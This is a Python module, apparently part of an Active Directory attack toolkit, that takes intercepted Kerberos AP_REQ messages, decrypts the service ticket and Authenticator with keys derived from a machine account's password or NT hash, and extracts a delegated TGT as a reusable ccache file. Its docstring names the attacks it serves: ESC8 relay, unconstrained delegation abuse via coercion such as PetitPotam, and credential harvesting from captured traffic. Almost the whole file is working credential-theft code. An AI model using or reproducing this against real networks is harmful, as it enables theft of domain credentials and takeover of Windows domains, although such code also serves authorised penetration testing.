"""Kerberos AP_REQ decryption and delegated TGT extraction.

Reusable core primitive for any attack that intercepts Kerberos authentication
and needs to extract the forwarded TGT carried by unconstrained delegation:

  - ESC8 Kerberos relay (DC authenticates to attacker's service)
  - Unconstrained delegation exploitation (printerbug, PetitPotam, etc.)
  - Kerberos credential harvesting from captured SMB/HTTP traffic

Flow summary:
  1. Parse SPNEGO NegTokenInit wrapper → raw AP_REQ DER bytes
  2. Decrypt the service ticket using the service account's long-term key
     (RC4-HMAC from NT hash, or AES-128/256 from password + salt)
  3. Extract the session key from the decrypted EncTicketPart
  4. Decrypt the Authenticator using the session key
  5. Parse the Authenticator checksum (type 0x8003 = GSSAPI)
     → extract forwarded TGT (KRB_CRED) if GSS_C_DELEG_FLAG is set
  6. Wrap the KRB_CRED as a ccache file → ready for kerberos_transport.get_tgs()

References:
  RFC 4120 §5.5.1  AP_REQ / Authenticator
  RFC 4121 §4.1.1  GSSAPI checksum (type 0x8003) with delegation info
  [MS-KILE] §3.4.5.1  Kerberos service ticket decryption
"""

from __future__ import annotations

import struct
from dataclasses import dataclass

from adscan_core import telemetry
from adscan_internal.rich_output import print_info_debug, print_warning_debug
from adscan_core.rich_output import print_exception


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class APReqServiceTicket:
    """Data extracted from the service ticket inside an AP_REQ."""

    session_key: bytes
    session_key_etype: int
    client_realm: str
    client_name: str
    ticket_flags: int


@dataclass(frozen=True)
class DelegatedTGT:
    """A forwarded TGT extracted from an AP_REQ Authenticator checksum.

    ``ccache_bytes`` is ready to be passed to
    ``KerberosConfig(ccache_bytes=...)`` and ``kerberos_transport.get_tgs()``.
    """

    ccache_bytes: bytes
    client_realm: str
    client_name: str
    etype: int


# ---------------------------------------------------------------------------
# SPNEGO / GSSAPI unwrapping
# ---------------------------------------------------------------------------


def extract_ap_req_from_spnego(spnego_bytes: bytes) -> bytes | None:
    """Extract the raw DER-encoded AP_REQ from a SPNEGO NegTokenInit blob.

    Returns None if the blob is not SPNEGO-wrapped Kerberos (e.g. NTLM).
    """
    try:
        from impacket.spnego import SPNEGO_NegTokenInit

        # Try impacket SPNEGO first
        blob = SPNEGO_NegTokenInit()
        blob.fromString(spnego_bytes)
        mech_types = blob.getComponent("mechTypes")  # pylint: disable=no-member
        for i in range(len(mech_types)):
            oid = str(mech_types.getComponentByPosition(i))
            if "1.2.840.113554.1.2.2" in oid:  # Kerberos 5 OID
                mech_token = blob.getComponent("mechToken")
                if mech_token.isValue:
                    raw = bytes(mech_token)
                    # Strip GSSAPI application tag if present ([APPLICATION 14])
                    return _strip_gssapi_wrapper(raw)
    except Exception:
        pass

    # Fallback: manual parse — look for Kerberos OID + AP_REQ tag
    return _parse_spnego_manual(spnego_bytes)


def _strip_gssapi_wrapper(data: bytes) -> bytes:
    """Strip the outer GSSAPI application wrapper [APPLICATION 0x60] if present."""
    if not data:
        return data
    # GSSAPI wrapper starts with 0x60 (APPLICATION 0) tag
    if data[0] == 0x60:
        # TLV: skip tag + length
        offset = 1
        if data[offset] & 0x80:
            n = data[offset] & 0x7F
            offset += 1 + n
        else:
            offset += 1
        # OID follows — skip it (OID tag 0x06)
        if offset < len(data) and data[offset] == 0x06:
            oid_len = data[offset + 1]
            offset += 2 + oid_len
        return data[offset:]
    return data


def _parse_spnego_manual(data: bytes) -> bytes | None:
    """Fallback: scan for the AP_REQ APPLICATION 14 tag (0x6e) in the blob."""
    # AP_REQ is tagged [APPLICATION 14] → DER tag = 0x6e
    idx = data.find(b"\x6e")
    if idx == -1:
        return None
    return data[idx:]


# ---------------------------------------------------------------------------
# Kerberos key derivation from computer account credentials
# ---------------------------------------------------------------------------


def derive_service_keys(
    password: "str | bytes",
    nt_hash_hex: str,
    domain: str,
    hostname: str,
) -> list[tuple[int, bytes]]:
    """Derive all standard Kerberos long-term keys for a computer account.

    ``password`` may be a Unicode string (service/user accounts) or raw bytes
    (machine account Kerberos password as stored by pypykatz ``kerberos_password``
    field — used for AES key derivation on machine accounts extracted from LSA).
    kerbad's ``string_to_key`` passes the value directly to PBKDF2 which accepts
    both str and bytes.

    Returns a list of (etype, key_bytes) pairs in priority order:
    AES256 → AES128 → RC4 (NT hash).
    """
    from kerbad.protocol.encryption import string_to_key, Enctype

    keys: list[tuple[int, bytes]] = []
    # AES salt for computer accounts: REALM + "host" + fqdn.lower()
    # e.g. BLACKFIELD.LOCALhostdc01.blackfield.local
    # The hostname must be the full FQDN (not the short name).  Strip trailing
    # "$" first, then append the domain if no "." is present.
    host = (hostname if isinstance(hostname, str) else hostname.decode()).rstrip("$").lower()
    if "." not in host:
        host = f"{host}.{domain.lower()}"
    salt_str = f"{domain.upper()}host{host}"

    # unicrypto PBKDF2 requires password and salt to be the same type.
    # Machine account kerberos_password from pypykatz is raw bytes; encode
    # the string salt to bytes so the HMAC concatenation inside PBKDF2 succeeds.
    if isinstance(password, bytes):
        aes_password: "str | bytes" = password
        aes_salt: "str | bytes" = salt_str.encode("utf-8")
    else:
        aes_password = password
        aes_salt = salt_str

    if password:
        try:
            k256 = string_to_key(Enctype.AES256, aes_password, aes_salt)
            keys.append((18, k256.contents))  # etype 18 = AES256
        except Exception:
            pass
        try:
            k128 = string_to_key(Enctype.AES128, aes_password, aes_salt)
            keys.append((17, k128.contents))  # etype 17 = AES128
        except Exception:
            pass

    if nt_hash_hex:
        try:
            keys.append((23, bytes.fromhex(nt_hash_hex)))  # etype 23 = RC4-HMAC
        except Exception:
            pass
    elif isinstance(password, str) and password:
        # NT hash derivation only makes sense for text passwords; raw binary
        # machine account passwords already have the NT hash in machine_nt_hash.
        try:
            import hashlib

            nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()
            keys.append((23, nt_hash))
        except Exception:
            pass

    return keys


# ---------------------------------------------------------------------------
# Ticket decryption
# ---------------------------------------------------------------------------


def decrypt_service_ticket(
    ap_req_bytes: bytes,
    service_keys: list[tuple[int, bytes]],
) -> APReqServiceTicket | None:
    """Decrypt the service ticket in an AP_REQ using candidate service keys.

    Tries each (etype, key) pair until one succeeds. Returns None if none works
    (wrong key or etype mismatch).
    """
    from kerbad.protocol.asn1_structs import AP_REQ, EncTicketPart
    from kerbad.protocol.encryption import _enctype_table, Key

    try:
        ap_req = AP_REQ.load(ap_req_bytes)
    except Exception as exc:
        print_warning_debug(f"[krb_ap_req] AP_REQ parse failed: {exc}")
        return None

    ticket = ap_req["ticket"]
    enc_part = ticket["enc-part"]
    ticket_etype = int(enc_part["etype"])
    ciphertext = bytes(enc_part["cipher"])

    for key_etype, key_bytes in service_keys:
        if key_etype != ticket_etype:
            continue
        try:
            key = Key(key_etype, key_bytes)
            decrypted = _enctype_table[key_etype].decrypt(key, 2, ciphertext)
            enc_ticket = EncTicketPart.load(decrypted)
            session_key_info = enc_ticket["key"]
            session_etype = int(session_key_info["keytype"])
            session_key = bytes(session_key_info["keyvalue"])
            crealm = str(enc_ticket["crealm"])
            cname = _principal_to_str(enc_ticket["cname"])
            flags = int(enc_ticket["flags"])
            print_info_debug(
                f"[krb_ap_req] decrypted service ticket for {cname}@{crealm} "
                f"(etype={key_etype})"
            )
            return APReqServiceTicket(
                session_key=session_key,
                session_key_etype=session_etype,
                client_realm=crealm,
                client_name=cname,
                ticket_flags=flags,
            )
        except Exception:
            continue

    # Also try without etype check (some implementations use RC4 regardless)
    for key_etype, key_bytes in service_keys:
        try:
            key = Key(key_etype, key_bytes)
            decrypted = _enctype_table[key_etype].decrypt(key, 2, ciphertext)
            enc_ticket = EncTicketPart.load(decrypted)
            session_key_info = enc_ticket["key"]
            session_etype = int(session_key_info["keytype"])
            session_key = bytes(session_key_info["keyvalue"])
            crealm = str(enc_ticket["crealm"])
            cname = _principal_to_str(enc_ticket["cname"])
            flags = int(enc_ticket["flags"])
            return APReqServiceTicket(
                session_key=session_key,
                session_key_etype=session_etype,
                client_realm=crealm,
                client_name=cname,
                ticket_flags=flags,
            )
        except Exception:
            continue

    print_warning_debug(
        f"[krb_ap_req] could not decrypt service ticket "
        f"(ticket_etype={ticket_etype}, tried {[e for e, _ in service_keys]})"
    )
    return None


# ---------------------------------------------------------------------------
# Authenticator decryption + delegated TGT extraction
# ---------------------------------------------------------------------------


def extract_delegated_tgt(
    ap_req_bytes: bytes,
    svc_ticket: APReqServiceTicket,
) -> DelegatedTGT | None:
    """Decrypt the AP_REQ Authenticator and extract the delegated TGT.

    Returns None if the ticket does not carry a forwarded TGT (e.g., the
    coerced machine is in Protected Users or doesn't have ok_as_delegate).

    The delegated TGT is carried in the GSSAPI Authenticator checksum
    (RFC 4121 §4.1.1) when GSS_C_DELEG_FLAG is set.
    """
    from kerbad.protocol.asn1_structs import AP_REQ, Authenticator
    from kerbad.protocol.encryption import _enctype_table, Key

    try:
        ap_req = AP_REQ.load(ap_req_bytes)
    except Exception as exc:
        print_warning_debug(
            f"[krb_ap_req] AP_REQ parse error on authenticator step: {exc}"
        )
        return None

    auth_enc = ap_req["authenticator"]
    auth_cipher = bytes(auth_enc["cipher"])

    try:
        key = Key(svc_ticket.session_key_etype, svc_ticket.session_key)
        decrypted = _enctype_table[svc_ticket.session_key_etype].decrypt(
            key,
            7,
            auth_cipher,  # key usage 7 = AP-REQ Authenticator
        )
        authenticator = Authenticator.load(decrypted)
    except Exception as exc:
        print_warning_debug(f"[krb_ap_req] Authenticator decryption failed: {exc}")
        return None

    # Parse GSSAPI checksum (type 0x8003)
    cksum = authenticator["cksum"]
    if not cksum.isValue:
        print_info_debug(
            "[krb_ap_req] Authenticator has no checksum — no delegated TGT"
        )
        return None

    cksum_type = int(cksum["cksumtype"])
    if cksum_type != 0x8003:
        print_info_debug(
            f"[krb_ap_req] Authenticator checksum type {cksum_type:#x} is not GSSAPI "
            f"(0x8003) — no delegated TGT"
        )
        return None

    checksum_data = bytes(cksum["checksum"])
    krb_cred_bytes = _parse_gssapi_checksum_delegation(checksum_data)

    if krb_cred_bytes is None:
        print_info_debug(
            "[krb_ap_req] GSS_C_DELEG_FLAG not set or no KRB_CRED in checksum"
        )
        return None

    # Wrap as ccache
    ccache_bytes = _krb_cred_to_ccache(krb_cred_bytes)
    if ccache_bytes is None:
        return None

    print_info_debug(
        f"[krb_ap_req] extracted delegated TGT for "
        f"{svc_ticket.client_name}@{svc_ticket.client_realm} "
        f"({len(krb_cred_bytes)} bytes KRB_CRED)"
    )
    return DelegatedTGT(
        ccache_bytes=ccache_bytes,
        client_realm=svc_ticket.client_realm,
        client_name=svc_ticket.client_name,
        etype=svc_ticket.session_key_etype,
    )


def _parse_gssapi_checksum_delegation(checksum_data: bytes) -> bytes | None:
    """Parse RFC 4121 §4.1.1 GSSAPI checksum and extract KRB_CRED if present.

    Layout:
      Bytes  0..3    Lgth (LE uint32) = 16 = length of Bnd field
      Bytes  4..19   Bnd (channel binding data, usually zeros)
      Bytes 20..23   Flags (LE uint32) — GSS_C_DELEG_FLAG = bit 0
      Bytes 24..25   DlgOpt (LE uint16) — delegation option (= 1 if present)
      Bytes 26..27   Dlgth (LE uint16) — length of following KRB_CRED
      Bytes 28..     Deleg (KRB_CRED DER-encoded)
    """
    if len(checksum_data) < 24:
        return None
    bnd_len = struct.unpack_from("<I", checksum_data, 0)[0]
    flags_offset = 4 + bnd_len
    if flags_offset + 8 > len(checksum_data):
        return None

    flags = struct.unpack_from("<I", checksum_data, flags_offset)[0]
    GSS_C_DELEG_FLAG = 0x01
    if not (flags & GSS_C_DELEG_FLAG):
        return None

    dlg_offset = flags_offset + 4
    if dlg_offset + 4 > len(checksum_data):
        return None

    dlg_len = struct.unpack_from("<H", checksum_data, dlg_offset + 2)[0]
    cred_start = dlg_offset + 4
    cred_end = cred_start + dlg_len

    if cred_end > len(checksum_data) or dlg_len == 0:
        return None

    return checksum_data[cred_start:cred_end]


def _krb_cred_to_ccache(krb_cred_bytes: bytes) -> bytes | None:
    """Convert KRB_CRED DER bytes to a ccache file (bytes)."""
    try:
        from kerbad.common.kirbi import Kirbi
        from kerbad.common.ccache import CCACHE

        kirbi = Kirbi.from_bytes(krb_cred_bytes)
        ccache = CCACHE.from_kirbi(kirbi)
        return ccache.to_bytes()
    except Exception as exc:
        try:
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
        except Exception:
            pass
        print_warning_debug(f"[krb_ap_req] KRB_CRED → ccache conversion failed: {exc}")
        return None


# ---------------------------------------------------------------------------
# High-level entry point
# ---------------------------------------------------------------------------


def ap_req_extract_tgt(
    spnego_or_ap_req_bytes: bytes,
    service_password: str,
    service_nt_hash_hex: str,
    domain: str,
    service_hostname: str,
) -> DelegatedTGT | None:
    """High-level: SPNEGO/AP_REQ bytes → DelegatedTGT.

    Tries all available key types (AES256, AES128, RC4) derived from
    ``service_password`` and ``service_nt_hash_hex`` for ``service_hostname``
    in ``domain``.

    Returns None if decryption fails or no delegated TGT is present.
    """
    # 1. Extract AP_REQ from SPNEGO wrapper (if wrapped)
    ap_req_bytes = extract_ap_req_from_spnego(spnego_or_ap_req_bytes)
    if ap_req_bytes is None:
        ap_req_bytes = spnego_or_ap_req_bytes  # assume raw AP_REQ

    # 2. Derive service keys
    service_keys = derive_service_keys(
        service_password, service_nt_hash_hex, domain, service_hostname
    )
    if not service_keys:
        print_warning_debug(
            "[krb_ap_req] no service keys available — provide password or NT hash"
        )
        return None

    # 3. Decrypt service ticket → get session key
    svc_ticket = decrypt_service_ticket(ap_req_bytes, service_keys)
    if svc_ticket is None:
        return None

    # 4. Decrypt Authenticator → extract delegated TGT
    return extract_delegated_tgt(ap_req_bytes, svc_ticket)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _principal_to_str(principal) -> str:
    """Convert a minikerberos PrincipalName ASN.1 to string."""
    try:
        name_string = principal["name-string"]
        parts = [str(name_string[i]) for i in range(len(name_string))]
        return "/".join(parts)
    except Exception:
        return str(principal)
